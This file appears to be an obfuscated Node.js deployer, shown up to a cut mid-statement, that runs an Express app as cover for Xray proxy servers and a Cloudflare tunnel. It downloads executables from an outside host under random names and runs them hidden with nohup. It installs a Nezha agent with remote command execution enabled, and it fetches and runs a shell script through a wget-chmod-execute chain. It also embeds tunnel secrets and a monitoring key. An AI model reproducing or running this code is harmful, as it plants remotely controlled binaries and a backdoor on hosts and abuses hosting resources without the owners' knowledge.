const _0x3b59bf=_0x5607;(function(_0x494cc8,_0x4eb294){const _0x86233=_0x5607,_0x1649cd=_0x494cc8();while(!![]){try{const _0x25f13c=parseInt(_0x86233(0x122))/0x1+parseInt(_0x86233(0x11b))/0x2+-parseInt(_0x86233(0x10c))/0x3+parseInt(_0x86233(0x19c))/0x4*(-parseInt(_0x86233(0x151))/0x5)+parseInt(_0x86233(0xb7))/0x6*(-parseInt(_0x86233(0x18b))/0x7)+parseInt(_0x86233(0xc2))/0x8*(-parseInt(_0x86233(0x16a))/0x9)+parseInt(_0x86233(0xcb))/0xa;if(_0x25f13c===_0x4eb294)break;else _0x1649cd['push'](_0x1649cd['shift']());}catch(_0x1554d8){_0x1649cd['push'](_0x1649cd['shift']());}}}(_0x40f6,0xea6a7));const _0x55abc6=(function(){let _0x268d02=!![];return function(_0x18d409,_0x409e5f){const _0x505383=_0x268d02?function(){const _0x466845=_0x5607;if(_0x409e5f){const _0x9167e7=_0x409e5f[_0x466845(0xc7)](_0x18d409,arguments);return _0x409e5f=null,_0x9167e7;}}:function(){};return _0x268d02=![],_0x505383;};}()),_0x2aa04e=_0x55abc6(this,function(){const _0x4d177c=_0x5607;return _0x2aa04e[_0x4d177c(0x129)]()['search'](_0x4d177c(0xeb)+'+$')['toString']()[_0x4d177c(0x162)+'r'](_0x2aa04e)[_0x4d177c(0x169)](_0x4d177c(0xeb)+'+$');});_0x2aa04e();const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x3b59bf(0x153)),{promisify}=require('util'),exec=promisify(require('child_proc'+_0x3b59bf(0x17c))['exec']),{execSync}=require(_0x3b59bf(0xaa)+'ess'),http=require('http'),httpProxy=require('http-proxy'),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x3b59bf(0x16b)+'L']||'',AUTO_ACCESS=process['env']['AUTO_ACCES'+'S']||![],FILE_PATH=process[_0x3b59bf(0xe1)][_0x3b59bf(0x102)]||'./tmp',SUB_PATH=process['env']['SUB_PATH']||'sub',PORT=process['env']['SERVER_POR'+'T']||process[_0x3b59bf(0xe1)][_0x3b59bf(0xd1)]||0xbb8,EXTERNAL_PORT=process['env'][_0x3b59bf(0x141)+'ORT']||0x1eb4,UUID=process[_0x3b59bf(0xe1)]['UUID']||'3f33f14e-6'+'a20-6d50-7'+'f2b-87915b'+'d2093a',NEZHA_SERVER=process['env']['NEZHA_SERV'+'ER']||'',NEZHA_PORT=process[_0x3b59bf(0xe1)][_0x3b59bf(0x13d)]||'',NEZHA_KEY=process[_0x3b59bf(0xe1)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x3b59bf(0xe1)]['ARGO_DOMAI'+'N']||'cftime.lln'+_0x3b59bf(0x19e),ARGO_AUTH=process['env']['ARGO_AUTH']||'{\x22AccountT'+_0x3b59bf(0xed)+_0x3b59bf(0x10a)+'d1a88ae015'+'afa598b\x22,\x22'+'TunnelSecr'+'et\x22:\x22N1EzD'+'h6/qIvsF1C'+'B1nVq3Ud2S'+'56HnMfbTfH'+'Qkp6wH9k=\x22'+_0x3b59bf(0x13c)+'\x22:\x2266e2951'+_0x3b59bf(0x17b)+'7-b6b0-c5d'+'6cbff04da\x22'+',\x22Endpoint'+'\x22:\x22\x22}',CFIP=process[_0x3b59bf(0xe1)]['CFIP']||'cdns.doon.'+_0x3b59bf(0x165),CFPORT=process[_0x3b59bf(0xe1)]['CFPORT']||0x1bb,NAME=process['env'][_0x3b59bf(0xe9)]||'',MONITOR_KEY=process['env'][_0x3b59bf(0x176)+'Y']||_0x3b59bf(0x123)+_0x3b59bf(0x154)+_0x3b59bf(0xe3)+_0x3b59bf(0x12e)+'0efee3e45d'+'119c2f2102'+_0x3b59bf(0xce),MONITOR_SERVER=process['env'][_0x3b59bf(0x138)+_0x3b59bf(0x179)]||'d3bkmf',MONITOR_URL=process['env'][_0x3b59bf(0x192)+'L']||'https://up'+_0x3b59bf(0xf3)+_0x3b59bf(0x13b)+_0x3b59bf(0x150);console['log']('使用的UUID:\x20'+UUID);MONITOR_KEY&&MONITOR_SERVER&&MONITOR_URL&&(console['log']('监控脚本已配置，将自'+'动运行'),console['log']('监控密钥:\x20'+MONITOR_KEY['substring'](0x0,0x8)+_0x3b59bf(0x14b)),console[_0x3b59bf(0xae)](_0x3b59bf(0x115)+MONITOR_SERVER),console['log']('监控URL:\x20'+MONITOR_URL));!fs[_0x3b59bf(0xb4)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH,{'recursive':!![]}),console['log'](FILE_PATH+_0x3b59bf(0xe8))):console['log'](FILE_PATH+'\x20已存在');function generateRandomName(){const _0x44c9a6=_0x3b59bf,_0x57e3ee=_0x44c9a6(0x105)+_0x44c9a6(0xd8)+_0x44c9a6(0x18a);let _0x2992fd='';for(let _0x3d1a23=0x0;_0x3d1a23<0x6;_0x3d1a23++){_0x2992fd+=_0x57e3ee['charAt'](Math[_0x44c9a6(0x114)](Math['random']()*_0x57e3ee[_0x44c9a6(0x109)]));}return _0x2992fd;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName(),monitorName='cf-vps-mon'+'itor.sh';let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x3b59bf(0x13a)](FILE_PATH,phpName),webPath=path[_0x3b59bf(0x13a)](FILE_PATH,webName),botPath=path[_0x3b59bf(0x13a)](FILE_PATH,botName),monitorPath=path['join'](FILE_PATH,monitorName),subPath=path['join'](FILE_PATH,_0x3b59bf(0x15f)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x3b59bf(0x13a)](FILE_PATH,_0x3b59bf(0xcf)),configPath=path['join'](FILE_PATH,'config.jso'+'n'),nezhaConfigPath=path[_0x3b59bf(0x13a)](FILE_PATH,_0x3b59bf(0xfa)+'l'),tunnelJsonPath=path['join'](FILE_PATH,'tunnel.jso'+'n'),tunnelYamlPath=path[_0x3b59bf(0x13a)](FILE_PATH,'tunnel.yml');const proxy=httpProxy['createProx'+'yServer'](),proxyServer=http['createServ'+'er']((_0x5b1a76,_0x24ab1d)=>{const _0x510474=_0x3b59bf,_0x30c395=_0x5b1a76[_0x510474(0xd2)];_0x30c395[_0x510474(0xf1)]('/vless-arg'+'o')||_0x30c395[_0x510474(0xf1)](_0x510474(0xa6)+'o')||_0x30c395['startsWith'](_0x510474(0x171)+'go')||_0x30c395==='/vless'||_0x30c395==='/vmess'||_0x30c395===_0x510474(0x16d)?proxy['web'](_0x5b1a76,_0x24ab1d,{'target':'http://loc'+'alhost:300'+'1'}):proxy['web'](_0x5b1a76,_0x24ab1d,{'target':_0x510474(0x17d)+'alhost:'+PORT});});proxyServer['on'](_0x3b59bf(0x15b),(_0x44d25d,_0xd13c5a,_0x1151fc)=>{const _0x48dde2=_0x3b59bf,_0x5c7e98=_0x44d25d['url'];_0x5c7e98['startsWith'](_0x48dde2(0x17f)+'o')||_0x5c7e98['startsWith']('/vmess-arg'+'o')||_0x5c7e98['startsWith']('/trojan-ar'+'go')?proxy['ws'](_0x44d25d,_0xd13c5a,_0x1151fc,{'target':_0x48dde2(0x17d)+_0x48dde2(0xfe)+'1'}):proxy['ws'](_0x44d25d,_0xd13c5a,_0x1151fc,{'target':'http://loc'+_0x48dde2(0x166)+PORT});}),proxyServer['listen'](EXTERNAL_PORT,()=>{const _0xa543e5=_0x3b59bf;console[_0xa543e5(0xae)]('代理服务器运行在端口'+':\x20'+EXTERNAL_PORT),console[_0xa543e5(0xae)]('HTTP流量\x20->\x20'+'localhost:'+PORT),console['log']('Xray流量\x20->\x20'+'localhost:'+_0xa543e5(0x148));}),app['get']('/',function(_0x3f83e4,_0x2b1f31){const _0x455719=_0x3b59bf,_0x326f59=path[_0x455719(0x13a)](__dirname,'index.html');fs[_0x455719(0xb4)](_0x326f59)?_0x2b1f31['sendFile'](_0x326f59):_0x2b1f31['send'](_0x455719(0x195)+'d!');});let subscriptionContent='';app['get']('/'+SUB_PATH,(_0x3908ba,_0x1a849c)=>{const _0x30dc1b=_0x3b59bf;subscriptionContent?(_0x1a849c[_0x30dc1b(0xf4)]('Content-Ty'+'pe',_0x30dc1b(0xd3)+_0x30dc1b(0x149)+_0x30dc1b(0x11c)),_0x1a849c[_0x30dc1b(0x120)](Buffer[_0x30dc1b(0xc3)](subscriptionContent)[_0x30dc1b(0x129)]('base64'))):_0x1a849c['status'](0x194)['send']('订阅尚未生成');});function deleteNodes(){const _0x2daa65=_0x3b59bf;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1b60fd;try{_0x1b60fd=fs[_0x2daa65(0x10b)+'nc'](subPath,'utf-8');}catch{return null;}const _0xb0bdd2=Buffer[_0x2daa65(0xc3)](_0x1b60fd,'base64')['toString'](_0x2daa65(0x11c)),_0x16be57=_0xb0bdd2['split']('\x0a')['filter'](_0x511511=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x511511));if(_0x16be57['length']===0x0)return;return axios['post'](UPLOAD_URL+('/api/delet'+'e-nodes'),JSON['stringify']({'nodes':_0x16be57}),{'headers':{'Content-Type':'applicatio'+'n/json'}})['catch'](_0xc66ab2=>{return null;}),null;}catch(_0x408d67){return null;}}function cleanupOldFiles(){try{const _0x2e1e26=fs['readdirSyn'+'c'](FILE_PATH);_0x2e1e26['forEach'](_0x1b568d=>{const _0x2415ca=_0x5607,_0x29bc1e=path['join'](FILE_PATH,_0x1b568d);try{const _0x48ccea=fs['statSync'](_0x29bc1e);_0x48ccea[_0x2415ca(0x17e)]()&&_0x1b568d!==monitorName&&fs['unlinkSync'](_0x29bc1e);}catch(_0x392486){}});}catch(_0x134b06){}}async function generateConfig(){const _0x38283e=_0x3b59bf,_0x196f44={'log':{'access':'/dev/null','error':_0x38283e(0x173),'loglevel':_0x38283e(0xf0)},'dns':{'servers':['https+loca'+'l://8.8.8.'+_0x38283e(0xac)+'y',_0x38283e(0x16f)+'l://1.1.1.'+'1/dns-quer'+'y','8.8.8.8','1.1.1.1'],'queryStrategy':_0x38283e(0x18d),'disableCache':![]},'inbounds':[{'port':0xbb9,'protocol':_0x38283e(0xbe),'settings':{'clients':[{'id':UUID,'flow':_0x38283e(0x134)+_0x38283e(0x104)}],'decryption':'none','fallbacks':[{'dest':0xbba},{'path':'/vless-arg'+'o','dest':0xbbb},{'path':_0x38283e(0xa6)+'o','dest':0xbbc},{'path':'/trojan-ar'+'go','dest':0xbbd}]},'streamSettings':{'network':_0x38283e(0x164)}},{'port':0xbba,'listen':_0x38283e(0xfb),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x38283e(0x164),'security':_0x38283e(0xf0)}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x38283e(0xbe),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbd,'listen':_0x38283e(0xfb),'protocol':_0x38283e(0x113),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-ar'+'go'}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}}],'outbounds':[{'protocol':'freedom','tag':_0x38283e(0x183),'settings':{'domainStrategy':_0x38283e(0x18d)}},{'protocol':_0x38283e(0x111),'tag':_0x38283e(0xa7)}],'routing':{'domainStrategy':'IPIfNonMat'+'ch','rules':[]}};fs[_0x38283e(0xbd)+'ync'](path[_0x38283e(0x13a)](FILE_PATH,'config.jso'+'n'),JSON['stringify'](_0x196f44,null,0x2)),console[_0x38283e(0xae)](_0x38283e(0x15c)+'完成');}function _0x5607(_0x42a5ce,_0x4f2bc1){const _0x365d19=_0x40f6();return _0x5607=function(_0x2aa04e,_0x55abc6){_0x2aa04e=_0x2aa04e-0xa5;let _0x40f64c=_0x365d19[_0x2aa04e];return _0x40f64c;},_0x5607(_0x42a5ce,_0x4f2bc1);}function getSystemArchitecture(){const _0x30840c=_0x3b59bf,_0x5e505c=os['arch']();return _0x5e505c==='arm'||_0x5e505c===_0x30840c(0x137)||_0x5e505c===_0x30840c(0x136)?'arm':'amd';}function downloadFile(_0x9b33fc,_0xaa4083){return new Promise((_0x5c0525,_0x1f1c68)=>{const _0x58cd7a=_0x5607,_0x425055=_0x9b33fc;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x27c503=fs[_0x58cd7a(0x186)+'eStream'](_0x425055);axios({'method':'get','url':_0xaa4083,'responseType':_0x58cd7a(0xea)})['then'](_0x42f974=>{const _0x13dc8e=_0x58cd7a;_0x42f974['data']['pipe'](_0x27c503),_0x27c503['on'](_0x13dc8e(0x110),()=>{const _0x5f1bf5=_0x13dc8e;_0x27c503['close'](),console['log'](_0x5f1bf5(0x14a)+path['basename'](_0x425055)+_0x5f1bf5(0x12d)),_0x5c0525(_0x425055);}),_0x27c503['on']('error',_0x4874a4=>{const _0x14bf10=_0x13dc8e;fs['unlink'](_0x425055,()=>{});const _0x5ef8d7=_0x14bf10(0x14a)+path['basename'](_0x425055)+'\x20失败:\x20'+_0x4874a4[_0x14bf10(0xc1)];console['error'](_0x5ef8d7),_0x1f1c68(_0x5ef8d7);});})['catch'](_0x5e7621=>{const _0x2995cd=_0x58cd7a,_0x20c7ed='下载\x20'+path[_0x2995cd(0x16c)](_0x425055)+_0x2995cd(0xaf)+_0x5e7621[_0x2995cd(0xc1)];console[_0x2995cd(0x11d)](_0x20c7ed),_0x1f1c68(_0x20c7ed);});});}async function downloadAndRunMonitorScript(){const _0x573e49=_0x3b59bf;if(!MONITOR_KEY||!MONITOR_SERVER||!MONITOR_URL){console['log'](_0x573e49(0x172)+_0x573e49(0xc4));return;}await new Promise(_0x11dd18=>setTimeout(_0x11dd18,0x2710)),console['log']('开始下载并运行监控脚'+'本...');try{const _0x417a84=_0x573e49(0xee)+'w.githubus'+'ercontent.'+_0x573e49(0xf2)+'lax/cf-vps'+_0x573e49(0xd5)+_0x573e49(0xd0)+_0x573e49(0x19d)+'h';console[_0x573e49(0xae)]('从\x20'+_0x417a84+'\x20下载监控脚本'),await downloadFile(monitorPath,_0x417a84),fs['chmodSync'](monitorPath,0x1ed),console['log'](_0x573e49(0x116)+'成功'),await runMonitorScript();}catch(_0x35860c){console['error'](_0x573e49(0x15e)+'败:\x20'+_0x35860c['message']),await runDirectMonitor();}}async function runMonitorScript(){const _0x4a1df6=_0x3b59bf,_0x880316=['-i','-k',MONITOR_KEY,'-s',MONITOR_SERVER,'-u',MONITOR_URL];console['log']('运行监控脚本:\x20'+monitorPath+'\x20'+_0x880316['join']('\x20'));try{const _0x4b9b44=_0x4a1df6(0xc9)+monitorPath+'\x20'+_0x880316[_0x4a1df6(0x13a)]('\x20')+('\x20>/dev/nul'+'l\x202>&1\x20&');await exec(_0x4b9b44),console[_0x4a1df6(0xae)]('监控脚本启动成功'),await new Promise(_0x311bf2=>setTimeout(_0x311bf2,0xbb8)),await checkMonitorRunning();}catch(_0x10a3e7){console['error']('运行监控脚本失败:\x20'+_0x10a3e7['message']);throw _0x10a3e7;}}async function checkMonitorRunning(){const _0x41fa69=_0x3b59bf;try{const _0x43d670=_0x41fa69(0x155)+'rep\x20-v\x20gre'+_0x41fa69(0x125)+monitorName+'\x22',{stdout:_0x534739}=await exec(_0x43d670);return _0x534739['trim']()?(console['log'](_0x41fa69(0x146)),!![]):(console['log']('监控脚本未运行，尝试'+'重启...'),await runDirectMonitor(),![]);}catch(_0x2224f5){return console[_0x41fa69(0x11d)]('检查监控状态失败:',_0x2224f5['message']),![];}}async function runDirectMonitor(){const _0x40bbd7=_0x3b59bf;console[_0x40bbd7(0xae)](_0x40bbd7(0x119)+_0x40bbd7(0x14b));const _0x5d2bdf=_0x40bbd7(0x100)+'://raw.git'+_0x40bbd7(0xfd)+'tent.com/k'+'adidalax/c'+_0x40bbd7(0x131)+_0x40bbd7(0x17a)+_0x40bbd7(0x131)+'tor.sh\x20-O\x20'+monitorPath+('\x20&&\x20chmod\x20'+_0x40bbd7(0x14d))+monitorPath+_0x40bbd7(0x190)+monitorPath+'\x20-i\x20-k\x20'+MONITOR_KEY+_0x40bbd7(0xd6)+MONITOR_SERVER+_0x40bbd7(0xb1)+MONITOR_URL;try{await exec(_0x5d2bdf),console['log']('监控命令执行成功'),await new Promise(_0x2b3cd5=>setTimeout(_0x2b3cd5,0xbb8)),await checkMonitorRunning();}catch(_0x8c266){console[_0x40bbd7(0x11d)]('直接运行监控命令失败'+':\x20'+_0x8c266[_0x40bbd7(0xc1)]);}}async function startMonitorHealthCheck(){const _0x2ca160=_0x3b59bf;if(!MONITOR_KEY||!MONITOR_SERVER||!MONITOR_URL)return;setInterval(async()=>{const _0xf6ecf7=_0x5607;console[_0xf6ecf7(0xae)]('检查监控脚本运行状态'+'...'),await checkMonitorRunning();},0x5*0x3c*0x3e8),console[_0x2ca160(0xae)](_0x2ca160(0xa8));}async function downloadFilesAndRun(){const _0x1def80=_0x3b59bf,_0x457f9d=getSystemArchitecture(),_0x218631=getFilesForArchitecture(_0x457f9d);if(_0x218631['length']===0x0){console[_0x1def80(0xae)](_0x1def80(0x12b)+'文件');return;}try{const _0x449134=_0x218631['map'](_0x936ee9=>downloadFile(_0x936ee9['fileName'],_0x936ee9['fileUrl']));await Promise['all'](_0x449134);}catch(_0x3daa12){console['error']('下载文件时出错:',_0x3daa12);return;}function _0x27ff48(_0x1b4ecd){const _0x1100c2=0x1fd;_0x1b4ecd['forEach'](_0x43ecca=>{const _0x517852=_0x5607;if(fs[_0x517852(0xb4)](_0x43ecca))try{fs['chmodSync'](_0x43ecca,_0x1100c2),console['log']('授权成功\x20'+_0x43ecca+':\x20'+_0x1100c2[_0x517852(0x129)](0x8));}catch(_0x364919){console[_0x517852(0x11d)]('授权失败\x20'+_0x43ecca+':\x20'+_0x364919);}});}const _0x955aed=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x27ff48(_0x955aed);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x353241=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1def80(0x133)](':')['pop']():'',_0xf95c2c=new Set(['443',_0x1def80(0x143),_0x1def80(0x19b),_0x1def80(0x18e),_0x1def80(0x161),_0x1def80(0xf9)]),_0x4af267=_0xf95c2c[_0x1def80(0x170)](_0x353241)?'true':_0x1def80(0xb6),_0x5188fd='\x0aclient_se'+_0x1def80(0xbb)+NEZHA_KEY+('\x0adebug:\x20fa'+'lse\x0adisabl'+'e_auto_upd'+'ate:\x20true\x0a'+'disable_co'+'mmand_exec'+'ute:\x20false'+'\x0adisable_f'+'orce_updat'+_0x1def80(0xb3)+'sable_nat:'+'\x20false\x0adis'+'able_send_'+'query:\x20fal'+_0x1def80(0xc8)+_0x1def80(0x196)+'re_tls:\x20tr'+'ue\x0aip_repo'+_0x1def80(0x103)+'\x201800\x0arepo'+_0x1def80(0x197)+_0x1def80(0xe4))+NEZHA_SERVER+('\x0askip_conn'+'ection_cou'+'nt:\x20true\x0as'+'kip_procs_'+_0x1def80(0x181)+'e\x0atemperat'+'ure:\x20false'+'\x0atls:\x20')+_0x4af267+(_0x1def80(0xbf)+'_to_upgrad'+'e:\x20false\x0au'+'se_ipv6_co'+'untry_code'+_0x1def80(0x194)+_0x1def80(0xa5))+UUID;fs[_0x1def80(0xbd)+_0x1def80(0xcc)](nezhaConfigPath,_0x5188fd);const _0xf9789f='nohup\x20'+phpPath+'\x20-c\x20\x22'+nezhaConfigPath+(_0x1def80(0x174)+'ll\x202>&1\x20&');try{await exec(_0xf9789f),console['log'](phpName+_0x1def80(0xdf)),await new Promise(_0xae0d34=>setTimeout(_0xae0d34,0x3e8));}catch(_0x7dfe24){console[_0x1def80(0x11d)]('php运行错误:\x20'+_0x7dfe24);}}else{let _0x4d1352='';const _0x43bf0e=['443',_0x1def80(0x143),_0x1def80(0x19b),_0x1def80(0x18e),'2083','2053'];_0x43bf0e['includes'](NEZHA_PORT)&&(_0x4d1352='--tls');const _0x3b25bd=_0x1def80(0xc9)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4d1352+(_0x1def80(0xf8)+'-auto-upda'+_0x1def80(0x112)+_0x1def80(0xc6)+'--skip-con'+'n\x20--skip-p'+'rocs\x20>/dev'+_0x1def80(0xb5)+'\x20&');try{await exec(_0x3b25bd),console['log'](npmName+'\x20运行中'),await new Promise(_0x468518=>setTimeout(_0x468518,0x3e8));}catch(_0x4f13a4){console['error'](_0x1def80(0x157)+_0x4f13a4);}}}else console[_0x1def80(0xae)]('NEZHA变量为空，'+'跳过运行');const _0x2d234e='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+('/config.js'+'on\x20>/dev/n'+_0x1def80(0xd4));try{await exec(_0x2d234e),console['log'](webName+'\x20运行中'),await new Promise(_0x543ecb=>setTimeout(_0x543ecb,0x3e8));}catch(_0x42ba52){console['error'](_0x1def80(0x168)+_0x42ba52);}if(fs['existsSync'](botPath)){let _0xc11245;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0xc11245=_0x1def80(0x19a)+'dge-ip-ver'+'sion\x20auto\x20'+'--no-autou'+'pdate\x20--pr'+'otocol\x20htt'+'p2\x20run\x20--t'+'oken\x20'+ARGO_AUTH;else ARGO_AUTH[_0x1def80(0x193)](_0x1def80(0xdc)+'et')?(!fs['existsSync'](tunnelYamlPath)&&(console['log'](_0x1def80(0xe0)+_0x1def80(0x127)),await new Promise(_0x18016f=>setTimeout(_0x18016f,0x3e8))),_0xc11245=_0x1def80(0x19a)+'dge-ip-ver'+'sion\x20auto\x20'+'--config\x20'+tunnelYamlPath+'\x20run'):_0xc11245='tunnel\x20--e'+'dge-ip-ver'+'sion\x20auto\x20'+_0x1def80(0x12f)+_0x1def80(0xdd)+_0x1def80(0xba)+'p2\x20--logfi'+_0x1def80(0xad)+bootLogPath+('\x20--logleve'+'l\x20info\x20--u'+'rl\x20http://'+_0x1def80(0xf7))+EXTERNAL_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xc11245+(_0x1def80(0x130)+_0x1def80(0x156))),console['log'](botName+'\x20运行中'),console['log']('等待隧道启动...'),await new Promise(_0x32eb2b=>setTimeout(_0x32eb2b,0x1388));if(ARGO_AUTH['includes']('TunnelSecr'+'et'))try{process[_0x1def80(0xe7)]==='win32'?await exec('tasklist\x20|'+_0x1def80(0x12c)+botName+'\x20>\x20nul'):await exec('pgrep\x20-f\x20\x22'+'['+botName['charAt'](0x0)+']'+botName[_0x1def80(0xda)](0x1)+(_0x1def80(0x135)+'ull')),console[_0x1def80(0xae)]('隧道运行成功');}catch(_0x101361){console['error'](_0x1def80(0x180));}}catch(_0x4955de){console[_0x1def80(0x11d)](_0x1def80(0x145)+_0x4955de);}}await new Promise(_0x511272=>setTimeout(_0x511272,0x7d0));}function getFilesForArchitecture(_0x4211d6){const _0x2aabc9=_0x3b59bf;let _0x3d7058;_0x4211d6===_0x2aabc9(0xd7)?_0x3d7058=[{'fileName':webPath,'fileUrl':_0x2aabc9(0x10f)+_0x2aabc9(0xbc)+_0x2aabc9(0xe6)},{'fileName':botPath,'fileUrl':_0x2aabc9(0x10f)+'m64.ssss.n'+'yc.mn/bot'}]:_0x3d7058=[{'fileName':webPath,'fileUrl':'https://am'+'d64.ssss.n'+'yc.mn/web'},{'fileName':botPath,'fileUrl':'https://am'+_0x2aabc9(0x10d)+_0x2aabc9(0x18f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x91026f=_0x4211d6===_0x2aabc9(0xd7)?_0x2aabc9(0x10f)+'m64.ssss.n'+'yc.mn/agen'+'t':'https://am'+'d64.ssss.n'+'yc.mn/agen'+'t';_0x3d7058['unshift']({'fileName':npmPath,'fileUrl':_0x91026f});}else{const _0x5a856a=_0x4211d6===_0x2aabc9(0xd7)?'https://ar'+'m64.ssss.n'+'yc.mn/v1':_0x2aabc9(0x10e)+'d64.ssss.n'+'yc.mn/v1';_0x3d7058['unshift']({'fileName':phpPath,'fileUrl':_0x5a856a});}}return _0x3d7058;}function argoType(){const _0x7e0ec0=_0x3b59bf;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x7e0ec0(0xae)](_0x7e0ec0(0x191)+_0x7e0ec0(0xe2)+_0x7e0ec0(0x198)+_0x7e0ec0(0x13e));return;}if(ARGO_AUTH[_0x7e0ec0(0x193)]('TunnelSecr'+'et'))try{const _0x1f8030=JSON['parse'](ARGO_AUTH),_0xe87f35=_0x1f8030['TunnelID'];fs['writeFileS'+'ync'](tunnelJsonPath,ARGO_AUTH);const _0x2aeaf6=_0x7e0ec0(0x167)+_0xe87f35+('\x0acredentia'+_0x7e0ec0(0xb2))+tunnelJsonPath+(_0x7e0ec0(0x175)+'\x20http2\x0a\x0ain'+'gress:\x0a\x20\x20-'+'\x20hostname:'+'\x20')+ARGO_DOMAIN+(_0x7e0ec0(0x14c)+'ce:\x20http:/'+'/localhost'+':')+EXTERNAL_PORT+(_0x7e0ec0(0x184)+'nRequest:\x0a'+'\x20\x20\x20\x20\x20\x20noTL'+'SVerify:\x20t'+_0x7e0ec0(0x11e)+_0x7e0ec0(0x189)+'p_status:4'+'04\x0a');fs['writeFileS'+'ync'](tunnelYamlPath,_0x2aeaf6),console[_0x7e0ec0(0xae)](_0x7e0ec0(0x16e)+'成功');}catch(_0x5e5ec4){console['error']('生成隧道配置错误:',_0x5e5ec4);}else console['log'](_0x7e0ec0(0xb9)+'不是TunnelSe'+_0x7e0ec0(0xcd)+'oken连接隧道');}async function getMetaInfo(){const _0x18c187=_0x3b59bf;try{const _0x5ed4dc=await axios['get'](_0x18c187(0xd9)+'api.co/jso'+'n/',{'timeout':0xbb8});if(_0x5ed4dc['data']&&_0x5ed4dc['data'][_0x18c187(0xfc)+'de']&&_0x5ed4dc['data'][_0x18c187(0x13f)])return(_0x5ed4dc[_0x18c187(0xff)]['country_co'+'de']+'_'+_0x5ed4dc['data'][_0x18c187(0x13f)])[_0x18c187(0x106)](/ /g,'_');}catch(_0xacb646){try{const _0x1a4e86=await axios['get'](_0x18c187(0xde)+'api.com/js'+_0x18c187(0xef),{'timeout':0xbb8});if(_0x1a4e86['data']&&_0x1a4e86['data'][_0x18c187(0x199)]==='success'&&_0x1a4e86['data'][_0x18c187(0x185)+'e']&&_0x1a4e86[_0x18c187(0xff)]['org'])return(_0x1a4e86['data']['countryCod'+'e']+'_'+_0x1a4e86['data'][_0x18c187(0x13f)])['replace'](/ /g,'_');}catch(_0x1ed0f6){}}return'Unknown';}async function extractDomains(){const _0x172155=_0x3b59bf;let _0x5712d5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5712d5=ARGO_DOMAIN,console['log'](_0x172155(0x191)+'N:',_0x5712d5),await _0x530422(_0x5712d5);else try{const _0x422d9c=fs['readFileSy'+'nc'](bootLogPath,_0x172155(0x11c)),_0x5bd8e4=_0x422d9c[_0x172155(0x133)]('\x0a'),_0x2b9c67=[];_0x5bd8e4['forEach'](_0x382c85=>{const _0x61bdaf=_0x382c85['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x61bdaf){const _0x207339=_0x61bdaf[0x1];_0x2b9c67['push'](_0x207339);}});if(_0x2b9c67['length']>0x0)_0x5712d5=_0x2b9c67[0x0],console['log'](_0x172155(0x117)+':',_0x5712d5),await _0x530422(_0x5712d5);else{console['log']('未找到ArgoDom'+_0x172155(0xc5)+_0x172155(0x147)+'ain'),fs['unlinkSync'](bootLogPath);async function _0x9d7d3e(){const _0x453e71=_0x172155;try{process[_0x453e71(0xe7)]===_0x453e71(0xec)?await exec(_0x453e71(0xca)+'f\x20/im\x20'+botName+('.exe\x20>\x20nul'+'\x202>&1')):await exec('pkill\x20-f\x20\x22'+'['+botName[_0x453e71(0xf5)](0x0)+']'+botName['substring'](0x1)+('\x22\x20>\x20/dev/n'+'ull\x202>&1'));}catch(_0x2bdac9){}}_0x9d7d3e(),await new Promise(_0x2d4b74=>setTimeout(_0x2d4b74,0xbb8));const _0x3ed9cd=_0x172155(0x19a)+_0x172155(0x15a)+'sion\x20auto\x20'+'--no-autou'+'pdate\x20--pr'+_0x172155(0xba)+'p2\x20--logfi'+'le\x20'+bootLogPath+(_0x172155(0x132)+_0x172155(0x140)+'rl\x20http://'+'localhost:')+EXTERNAL_PORT;try{await exec(_0x172155(0xc9)+botPath+'\x20'+_0x3ed9cd+('\x20>/dev/nul'+'l\x202>&1\x20&')),console['log'](botName+_0x172155(0xdf)),await new Promise(_0x108a37=>setTimeout(_0x108a37,0xbb8)),await extractDomains();}catch(_0x65e3ea){console[_0x172155(0x11d)](_0x172155(0x145)+_0x65e3ea);}}}catch(_0x5b5de7){console['error'](_0x172155(0x18c)+'错误:',_0x5b5de7);}async function _0x530422(_0x37c36f){const _0x1080d2=_0x172155,_0x1bbe10=await 